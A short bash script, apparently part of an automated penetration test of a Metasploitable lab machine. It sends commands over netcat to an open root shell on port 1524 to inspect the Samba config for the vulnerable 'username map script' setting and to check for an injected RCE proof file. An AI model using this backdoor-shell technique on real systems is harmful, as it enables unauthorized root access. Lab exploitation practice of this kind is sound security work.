#!/usr/bin/env bash
# Diagnostic: use the confirmed 1524 root shell to inspect target-m's Samba
# config and see whether (a) the vulnerable 'username map script' directive is
# present in this image and (b) our injected proof file was ever written.
set -uo pipefail
OUT="/opt/argus-ai/gemini-scans/metasploitable/_samba_check.txt"
{
  echo "### target-m Samba config check (via 1524 root shell) ###"
  printf '%s\n' \
    'echo ===SMBCONF===' \
    'grep -niE "username map|map script|add machine|guest ok|map to guest" /etc/samba/smb.conf' \
    'echo ===TESTPARM===' \
    'testparm -s 2>/dev/null | grep -iE "username map|map to guest|guest ok"' \
    'echo ===PROOFFILE===' \
    'ls -la /tmp/argus_smb_rce 2>/dev/null || echo NO_PROOF_FILE_WRITTEN' \
    'echo ===SMBVER===' \
    'smbd -V 2>/dev/null' \
    'exit' | nc -w 6 target-m 1524
} 2>&1 | tee "$OUT"
